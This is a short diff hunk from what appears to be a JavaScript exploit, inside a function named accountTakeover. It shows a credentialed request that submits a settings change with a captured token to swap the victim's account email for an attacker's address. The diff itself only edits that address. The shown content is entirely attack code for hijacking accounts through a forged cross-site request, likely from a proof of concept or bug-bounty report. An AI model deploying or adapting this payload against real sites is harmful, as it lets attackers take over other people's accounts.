@@ -30,7 +30,7 @@ function accountTakeover()
         xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.withCredentials = true;
-        var body = "post_type=settings&token="+token+"&email=hacky45.94%40gmail.com";
+        var body = "post_type=settings&token="+token+"&email=hacky459.4%40gmail.com";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i); 
